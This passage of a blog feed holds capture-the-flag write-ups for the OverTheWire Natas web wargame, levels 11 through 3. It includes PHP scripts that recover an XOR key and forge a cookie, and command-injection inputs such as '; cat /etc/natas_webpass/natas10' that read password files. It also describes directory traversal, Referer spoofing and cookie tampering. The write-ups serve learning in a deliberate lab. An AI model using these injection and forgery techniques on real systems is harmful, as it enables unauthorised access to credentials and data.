&amp;amp;lt;?

$defaultdata&amp;amp;nbsp;=&amp;amp;nbsp;array(&amp;amp;nbsp;&amp;quot;showpassword&amp;quot;=&amp;amp;gt;&amp;quot;no&amp;quot;,&amp;amp;nbsp;&amp;quot;bgcolor&amp;quot;=&amp;amp;gt;&amp;quot;#ffffff&amp;quot;);

function&amp;amp;nbsp;xor_encrypt($in)&amp;amp;nbsp;{
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$key&amp;amp;nbsp;=&amp;amp;nbsp;&#39;&amp;amp;lt;censored&amp;amp;gt;&#39;;
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$text&amp;amp;nbsp;=&amp;amp;nbsp;$in;
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$outText&amp;amp;nbsp;=&amp;amp;nbsp;&#39;&#39;;

&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;//&amp;amp;nbsp;Iterate&amp;amp;nbsp;through&amp;amp;nbsp;each&amp;amp;nbsp;character
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;for($i=0;$i&amp;amp;lt;strlen($text);$i++)&amp;amp;nbsp;{
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$outText&amp;amp;nbsp;.=&amp;amp;nbsp;$text[$i]&amp;amp;nbsp;^&amp;amp;nbsp;$key[$i&amp;amp;nbsp;%&amp;amp;nbsp;strlen($key)];
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;}

&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;return&amp;amp;nbsp;$outText;
}

function&amp;amp;nbsp;loadData($def)&amp;amp;nbsp;{
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;global&amp;amp;nbsp;$_COOKIE;
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$mydata&amp;amp;nbsp;=&amp;amp;nbsp;$def;
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;if(array_key_exists(&amp;quot;data&amp;quot;,&amp;amp;nbsp;$_COOKIE))&amp;amp;nbsp;{
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$tempdata&amp;amp;nbsp;=&amp;amp;nbsp;json_decode(xor_encrypt(base64_decode($_COOKIE[&amp;quot;data&amp;quot;])),&amp;amp;nbsp;true);
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;if(is_array($tempdata)&amp;amp;nbsp;&amp;amp;amp;&amp;amp;amp;&amp;amp;nbsp;array_key_exists(&amp;quot;showpassword&amp;quot;,&amp;amp;nbsp;$tempdata)&amp;amp;nbsp;&amp;amp;amp;&amp;amp;amp;&amp;amp;nbsp;array_key_exists(&amp;quot;bgcolor&amp;quot;,&amp;amp;nbsp;$tempdata))&amp;amp;nbsp;{
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;if&amp;amp;nbsp;(preg_match(&#39;/^#(?:[a-f\d]{6})$/i&#39;,&amp;amp;nbsp;$tempdata[&#39;bgcolor&#39;]))&amp;amp;nbsp;{
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$mydata[&#39;showpassword&#39;]&amp;amp;nbsp;=&amp;amp;nbsp;$tempdata[&#39;showpassword&#39;];
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$mydata[&#39;bgcolor&#39;]&amp;amp;nbsp;=&amp;amp;nbsp;$tempdata[&#39;bgcolor&#39;];
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;}
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;}
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;}
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;return&amp;amp;nbsp;$mydata;
}

function&amp;amp;nbsp;saveData($d)&amp;amp;nbsp;{
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;setcookie(&amp;quot;data&amp;quot;,&amp;amp;nbsp;base64_encode(xor_encrypt(json_encode($d))));
}

$data&amp;amp;nbsp;=&amp;amp;nbsp;loadData($defaultdata);

if(array_key_exists(&amp;quot;bgcolor&amp;quot;,$_REQUEST))&amp;amp;nbsp;{
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;if&amp;amp;nbsp;(preg_match(&#39;/^#(?:[a-f\d]{6})$/i&#39;,&amp;amp;nbsp;$_REQUEST[&#39;bgcolor&#39;]))&amp;amp;nbsp;{
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$data[&#39;bgcolor&#39;]&amp;amp;nbsp;=&amp;amp;nbsp;$_REQUEST[&#39;bgcolor&#39;];
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;}
}

saveData($data);



?&amp;amp;gt;

&amp;amp;lt;h1&amp;amp;gt;natas11&amp;amp;lt;/h1&amp;amp;gt;
&amp;amp;lt;div&amp;amp;nbsp;id=&amp;quot;content&amp;quot;&amp;amp;gt;
&amp;amp;lt;body&amp;amp;nbsp;style=&amp;quot;background:&amp;amp;nbsp;&amp;amp;lt;?=$data[&#39;bgcolor&#39;]?&amp;amp;gt;;&amp;quot;&amp;amp;gt;
Cookies&amp;amp;nbsp;are&amp;amp;nbsp;protected&amp;amp;nbsp;with&amp;amp;nbsp;XOR&amp;amp;nbsp;encryption&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;

&amp;amp;lt;?
if($data[&amp;quot;showpassword&amp;quot;]&amp;amp;nbsp;==&amp;amp;nbsp;&amp;quot;yes&amp;quot;)&amp;amp;nbsp;{
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;print&amp;amp;nbsp;&amp;quot;The&amp;amp;nbsp;password&amp;amp;nbsp;for&amp;amp;nbsp;natas12&amp;amp;nbsp;is&amp;amp;nbsp;&amp;amp;lt;censored&amp;amp;gt;&amp;amp;lt;br&amp;amp;gt;&amp;quot;;
}

?&amp;amp;gt;

&amp;amp;lt;form&amp;amp;gt;
Background&amp;amp;nbsp;color:&amp;amp;nbsp;&amp;amp;lt;input&amp;amp;nbsp;name=bgcolor&amp;amp;nbsp;value=&amp;quot;&amp;amp;lt;?=$data[&#39;bgcolor&#39;]?&amp;amp;gt;&amp;quot;&amp;amp;gt;
&amp;amp;lt;input&amp;amp;nbsp;type=submit&amp;amp;nbsp;value=&amp;quot;Set&amp;amp;nbsp;color&amp;quot;&amp;amp;gt;
&amp;amp;lt;/form&amp;amp;gt;

&amp;amp;lt;div&amp;amp;nbsp;id=&amp;quot;viewsource&amp;quot;&amp;amp;gt;&amp;amp;lt;a&amp;amp;nbsp;href=&amp;quot;index-source.html&amp;quot;&amp;amp;gt;View&amp;amp;nbsp;sourcecode&amp;amp;lt;/a&amp;amp;gt;&amp;amp;lt;/div&amp;amp;gt;
&amp;amp;lt;/div&amp;amp;gt;
&amp;amp;lt;/body&amp;amp;gt;
&amp;amp;lt;/html&amp;amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I viewed my cookie, using the amazing, &lt;a href=&#34;https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg&#34;&gt;Edit This Cookie&lt;/a&gt;, Chrome extension. Note that the last character is a &amp;ldquo;=&amp;rdquo;, but it&amp;rsquo;s encoded in the cookie as &amp;ldquo;%3D&amp;rdquo; due to encoding.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas11_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I then took this cookie value and figured that maybe I could decode it. XOR encryption is reversible if you know &lt;sup&gt;2&lt;/sup&gt;&amp;frasl;&lt;sub&gt;3&lt;/sub&gt; parts. You have A XOR KEY = C, for example. If you know A and C, you can derive KEY by XORing A and C together the same way. I ended up writing some code in PHP (since the original was in PHP)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;amp;lt;?php

function find_xor_key($decrypted, $encrypted) {
 // This value should be the return of xor_encrypt with a base64 decode
 $base64_decoded = base64_decode($encrypted);

 // Before xoring, get the decrypted value into the same state it was
 $json_encoded = json_encode($decrypted);

 $outText = &#39;&#39;;

 for($i=0; $i &amp;amp;lt; strlen($json_encoded); $i++) {
  $outText .= $json_encoded[$i] ^ $base64_decoded[$i % strlen($base64_decoded)];
 } 

 return $outText;
}

$cookie = array(&amp;quot;showpassword&amp;quot;=&amp;amp;gt;&amp;quot;no&amp;quot;, &amp;quot;bgcolor&amp;quot;=&amp;amp;gt;&amp;quot;#ffffff&amp;quot;);

$key = find_xor_key($cookie, &amp;quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&amp;quot;) . &amp;quot;\n&amp;quot;;

print &amp;quot;XOR Key: &amp;quot; . $key . &amp;quot;\n&amp;quot;;

?&amp;amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When ran, this produces the following.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko$ php natas11_decode.php 
XOR Key: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So now I know that the XOR key is &amp;ldquo;qw8J&amp;rdquo;.  It&amp;rsquo;s repeated over and over, because the string it&amp;rsquo;s encoding is longer than the key, so it gets repeated, otherwise it&amp;rsquo;d be XOR to nothing.&lt;/p&gt;

&lt;p&gt;I then took this XOR key and tried to use it to encode a new cookie value, so that I could switch the &amp;ldquo;showpassword&amp;rdquo; value to &amp;ldquo;yes&amp;rdquo;.  I wrote the following script to do so.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;amp;lt;?php

function&amp;amp;nbsp;custom_xor($key,&amp;amp;nbsp;$in)&amp;amp;nbsp;{
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$outText&amp;amp;nbsp;=&amp;amp;nbsp;&#39;&#39;;
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;for($i&amp;amp;nbsp;=&amp;amp;nbsp;0;&amp;amp;nbsp;$i&amp;amp;nbsp;&amp;amp;lt;&amp;amp;nbsp;strlen($in);&amp;amp;nbsp;$i++)&amp;amp;nbsp;{
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$outText&amp;amp;nbsp;.=&amp;amp;nbsp;$in[$i]&amp;amp;nbsp;^&amp;amp;nbsp;$key[$i&amp;amp;nbsp;%&amp;amp;nbsp;strlen($key)];
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;}
&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;return&amp;amp;nbsp;$outText;
}

$cookie&amp;amp;nbsp;=&amp;amp;nbsp;array(&amp;quot;showpassword&amp;quot;=&amp;amp;gt;&amp;quot;yes&amp;quot;,&amp;amp;nbsp;&amp;quot;bgcolor&amp;quot;=&amp;amp;gt;&amp;quot;#ffffff&amp;quot;);
$key&amp;amp;nbsp;=&amp;amp;nbsp;&amp;quot;qw8J&amp;quot;;

print&amp;amp;nbsp;&amp;quot;New&amp;amp;nbsp;Cookie&amp;amp;nbsp;Value:&amp;amp;nbsp;&amp;quot;&amp;amp;nbsp;.&amp;amp;nbsp;base64_encode(custom_xor($key,&amp;amp;nbsp;json_encode($cookie)))&amp;amp;nbsp;.&amp;amp;nbsp;&amp;quot;\n&amp;quot;;

?&amp;amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When ran, it produced the following.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko$ php natas11_encode.php 
New Cookie Value: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then pasted that cookie value into my Edit This Cookie extension, and refreshed the page.  It then presented me with the password to the next level.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas11_3.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 10</title>
      <link>https://www.mattandreko.com/blog/2012-11-09-overthewire-natas-level-10/</link>
      <pubDate>Fri, 09 Nov 2012 07:28:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-09-overthewire-natas-level-10/</guid>
      <description>&lt;p&gt;On to &lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas10.shtml&#34;&gt;Level 10&lt;/a&gt; of the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&lt;/a&gt; Natas wargame! This level is extremely similar to level 9, except that now they are implementing a basic filtering, to prevent you from entering certain characters that could cause changes in the execution of the program. However, their filter is flawed.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;It starts out just like the last level, with a search dialog.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas10_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Again, as always, I review the code since it&amp;rsquo;s available. You can see that it&amp;rsquo;s using a &amp;ldquo;preg_match&amp;rdquo; to try to filter out bad characters. This however is flawed still. Instead of a blacklist, it should be a whitelist of only certain values.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas10_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Because I can&amp;rsquo;t complete the command using a semicolon or ampersand, and start a new one, I instead go with the approach of having &amp;ldquo;grep&amp;rdquo; just return me the password file as well as the dictionary. I enter, &amp;lsquo;&amp;ldquo;$&amp;rdquo; /etc/natas_webpass/natas11&amp;rsquo;, and it is fairly successful. The &amp;ldquo;$&amp;rdquo; tells grep to search for any line that contains a &amp;ldquo;end of line&amp;rdquo;. Since pretty much every line will have that, it outputs the entire file. I then include the password file as well as the dictionary, so it reads me both back. This then provides the password to the next level.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas10_3.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 9</title>
      <link>https://www.mattandreko.com/blog/2012-11-08-overthewire-natas-level-9/</link>
      <pubDate>Thu, 08 Nov 2012 06:12:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-08-overthewire-natas-level-9/</guid>
      <description>&lt;p&gt;The next level of &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&amp;rsquo;s&lt;/a&gt; Nata challenge is &lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas9.shtml&#34;&gt;Level 9&lt;/a&gt;. This is a command injection vulnerability.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Initially, you are given a search box.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas9_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Just like in previous levels, I looked at the available source code. You can see the vulnerability is that the user input is not sanitized. Due to this, you can inject code into the &amp;ldquo;grep&amp;rdquo; command it is running to do the search.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas9_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I simply put in the search box, &amp;ldquo;; cat /etc/natas_webpass/natas10&amp;rdquo;, since that is where the password file is located. The command it ends up running is &amp;ldquo;grep -i; cat /etc/natas_webpass/natas10dictionary.txt&amp;rdquo;. The semi-colon terminates the &amp;ldquo;grep&amp;rdquo; command, and allows the &amp;ldquo;cat&amp;rdquo; to then run next. I end up passing in the password file, as well as the dictionary. In some cases, you may need to end the line with a comment, to keep it from executing, by putting in a &amp;ldquo;#&amp;rdquo;. Regardless, after running, you get the password to the next level.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas9_3.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 8</title>
      <link>https://www.mattandreko.com/blog/2012-11-07-overthewire-natas-level-8/</link>
      <pubDate>Wed, 07 Nov 2012 05:56:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-07-overthewire-natas-level-8/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas8.shtml&#34;&gt;Level 8&lt;/a&gt; of the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWires&lt;/a&gt; Natas wargame was pretty simple, as a developer, but could prove more difficult if you don&amp;rsquo;t have similar background.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;It starts out with a secret password input.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas8_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Like other levels, I looked at the source code to see what was going on in the background.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas8_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Based on this code, you can see that it has a stored secret value, that is base64 encoded, then reversed, and then converted to a hex string. That value is then compared to the stored secret value, and if it&amp;rsquo;s a match, it will give you the next level&amp;rsquo;s password.&lt;/p&gt;

&lt;p&gt;I decided to write a reversal program in php, since it was super easy. The only problem it gave me, was that there is no built-in hex2bin method until a newer version of PHP than I had on my machine. Luckily, on the &lt;a href=&#34;http://www.php.net/manual/en/function.bin2hex.php&#34;&gt;bin2hex&lt;/a&gt; documentation page, someone kindly wrote a reversal function that I stole.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas8_3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Once I executed that program in php, it gave me the decoded password. Once I entered it into the page, it gave me the password to the next level.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas8_4.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 7</title>
      <link>https://www.mattandreko.com/blog/2012-11-06-overthewire-natas-level-7/</link>
      <pubDate>Tue, 06 Nov 2012 05:32:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-06-overthewire-natas-level-7/</guid>
      <description>&lt;p&gt;Finally, with level 7 of OverTheWire&amp;rsquo;s Natas wargame, we start to get to more &amp;ldquo;real world&amp;rdquo; vulnerabilities. It&amp;rsquo;s still very easy, but it&amp;rsquo;s at least getting better.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We start with a single page, that has 2 navigation links.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas7_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I noted that the URLs had a &amp;ldquo;page=&amp;rdquo; parameter. I thought maybe this would be the file it was including. Viewing the source gave a nice reminder of where the password for the next level would be stored.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas7_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I then tried a directory traversal exploit, pointing to the password file for the next level. It successfully displayed the password.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas7_3.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 6</title>
      <link>https://www.mattandreko.com/blog/2012-11-05-overthewire-natas-level-6/</link>
      <pubDate>Mon, 05 Nov 2012 05:12:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-05-overthewire-natas-level-6/</guid>
      <description>&lt;p&gt;The &lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas6.shtml&#34;&gt;6th level&lt;/a&gt; of the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&lt;/a&gt; Natas wargame starts introducing us to PHP and server configuration issues.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;It starts out with a secret password prompt.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas6_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I took a look at the sourcecode, via the link provided.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas6_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I decided I would try and see if I could request the &amp;ldquo;secret.inc&amp;rdquo; file, and it worked perfectly.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas6_3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;After I put in the secret value into the input box, it showed me the password for the next level.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas6_4.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This level teaches that files that contain secrets should never be publicly accessible. Either put them in server-side code so that they&amp;rsquo;re not rendered, or put them out of the webroot.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 5</title>
      <link>https://www.mattandreko.com/blog/2012-11-04-overthewire-natas-level-5/</link>
      <pubDate>Sun, 04 Nov 2012 18:34:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-04-overthewire-natas-level-5/</guid>
      <description>&lt;p&gt;Now that we&amp;rsquo;re about &lt;sup&gt;1&lt;/sup&gt;&amp;frasl;&lt;sub&gt;3&lt;/sub&gt; through to the end of the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&lt;/a&gt; Natas wargame, I&amp;rsquo;m hoping that they start to get a little more tricky. &lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas5.shtml&#34;&gt;Level 5&lt;/a&gt; unfortunately is still pretty easy.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;It starts by simply telling you that you&amp;rsquo;re not logged in.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas5_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Logins often hand out cookies, so I viewed my cookies for the site. I then used the wonderful Chrome extension, &lt;a href=&#34;https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg&#34;&gt;Edit This Cookie&lt;/a&gt;, to modify the cookie that I saw it assign, from a &amp;ldquo;0&amp;rdquo; to a &amp;ldquo;1&amp;rdquo;, signifying that I was logged on.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas5_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;After saving the changes to the cookie, I refreshed the page, and it showed me the next level&amp;rsquo;s password.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas5_3.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 4</title>
      <link>https://www.mattandreko.com/blog/2012-11-03-overthewire-natas-level-4/</link>
      <pubDate>Sat, 03 Nov 2012 10:39:00 -0400</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-03-overthewire-natas-level-4/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas4.shtml&#34;&gt;Level 4&lt;/a&gt; of &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&amp;rsquo;s&lt;/a&gt; Natas wargame starts a little different than the previous levels. It immediately presents you with an error message.&lt;/p&gt;

&lt;!-- more --&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas4_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I figured this was going to be due to the HTTP Referer. I guessed that one could solve this by using a proxy or a browser addon, such as &lt;a href=&#34;https://chrome.google.com/webstore/detail/referer-control/hnkcfpcejkafcihlgbojoidoihckciin/related&#34;&gt;Referer Control&lt;/a&gt;, but I simply didn&amp;rsquo;t want to install anything new. I opened a bash window, and simulated my original HTTP GET.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas4_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Since I was then able to reproduce the error, I changed the HTTP Referer, and got the level 5 password.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas4_3.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 3</title>
      <link>https://www.mattandreko.com/blog/2012-11-02-overthewire-natas-level-3/</link>
      <pubDate>Fri, 02 Nov 2012 06:54:00 -0400</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-02-overthewire-natas-level-3/</guid>
      <description>&lt;p&gt;Continuing on with Level 3 of OverTheWire&amp;rsquo;s Natas wargame, I found the first page, like previous levels, saying that there was nothing on the page.&lt;/p&gt;

&lt;!-- more --&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas3_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I viewed the source and saw the strange comment about &amp;ldquo;Not even Google will find it&amp;rdquo;.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas3_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;After thinking about that for a minute, it clicked that maybe it was because of a &amp;ldquo;robots.txt&amp;rdquo; file, which would prevent search engines from finding any files. I then browsed to the &amp;ldquo;robots.txt&amp;rdquo; file.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas3_3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Inside the &amp;ldquo;robots.txt&amp;rdquo; file, it shows a directory that it has asked to not be indexed by search engines. I then navigated to that folder, and found a &amp;ldquo;users.txt&amp;rdquo; file.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas3_4.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Lucky for me, the &amp;ldquo;users.txt&amp;rdquo; file, contained the next level&amp;rsquo;s credentials.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas3_5.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 2</title>
      <link>https://www.mattandreko.com/blog/2012-11-01-overthewire-natas-level-2/</link>
